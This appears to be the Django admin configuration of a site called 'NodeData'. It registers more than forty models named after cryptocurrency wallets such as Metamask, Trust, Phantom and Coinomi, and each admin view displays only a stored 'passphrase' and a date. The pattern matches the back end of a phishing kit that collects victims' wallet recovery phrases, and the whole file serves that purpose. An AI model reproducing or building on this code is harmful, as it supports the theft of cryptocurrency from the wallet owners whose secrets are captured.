from django.contrib import admin

from .models import *

# Register your models here.
admin.site.site_header = 'NodeData Admin'
admin.site.site_title = 'NodeData'
admin.site.index_title = 'NodeData Admin'

class BitPayAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(BitPay, BitPayAdmin)

class SolanaAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Solana, SolanaAdmin)

class TrustAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Trust, TrustAdmin)

class MetamaskAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Metamask, MetamaskAdmin)

class HuobiWalletAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(HuobiWallet, HuobiWalletAdmin)

class PhantomAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Phantom, PhantomAdmin)

class WazirxAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Wazirx, WazirxAdmin)

class PillarAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Pillar, PillarAdmin)

class TokenpocketAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Tokenpocket, TokenpocketAdmin)

class AtomicAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Atomic, AtomicAdmin)

class WallethAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Walleth, WallethAdmin)

class AuthereumAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Authereum, AuthereumAdmin)

class EidooAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Eidoo, EidooAdmin)

class ZelcoreAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Zelcore, ZelcoreAdmin)

class NashAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Nash, NashAdmin)

class CoinomiAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Coinomi, CoinomiAdmin)

class GridplusAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Gridplus, GridplusAdmin)

class CoolWalletSAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(CoolWalletS, CoolWalletSAdmin)

class AliceAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Alice, AliceAdmin)

class AlphaWalletAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(AlphaWallet, AlphaWalletAdmin)

class TokenaryAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Tokenary, TokenaryAdmin)

class SafepalAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Safepal, SafepalAdmin)

class EqualAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Equal, EqualAdmin)

class InfinitoAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Infinito, InfinitoAdmin)

class MathwalletAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Mathwallet, MathwalletAdmin)

class MyKeyAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(MyKey, MyKeyAdmin)

class SpatiumAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Spatium, SpatiumAdmin)

class WalletioAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Walletio, WalletioAdmin)

class InfinityWalletAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(InfinityWallet, InfinityWalletAdmin)

class OwnBitAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(OwnBit, OwnBitAdmin)

class EasyPocketAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(EasyPocket, EasyPocketAdmin)

class ONTOAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(ONTO, ONTOAdmin)

class BridgeWalletAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(BridgeWallet, BridgeWalletAdmin)

class SparkPointAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(SparkPoint, SparkPointAdmin)

class ViaWalletAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(ViaWallet, ViaWalletAdmin)

class Coin98Admin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Coin98, Coin98Admin)

class BitKeepAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(BitKeep, BitKeepAdmin)

class VisionAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Vision, VisionAdmin)

class SFWTWalletAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(SFWTWallet, SFWTWalletAdmin)

class PeakDefiAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(PeakDefi, PeakDefiAdmin)

class XDCWalletAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(XDCWallet, XDCWalletAdmin)

class UnstoppableWalletAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(UnstoppableWallet, UnstoppableWalletAdmin)

class MEETONEAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(MEETONE, MEETONEAdmin)

class ATWalletAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(ATWallet, ATWalletAdmin)

class MoriXWalletAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(MoriXWallet, MoriXWalletAdmin)

class MidasWalletAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(MidasWallet, MidasWalletAdmin)

class OthersAdmin(admin.ModelAdmin):
    list_display = ('id', 'passphrase', 'date')

admin.site.register(Others, OthersAdmin)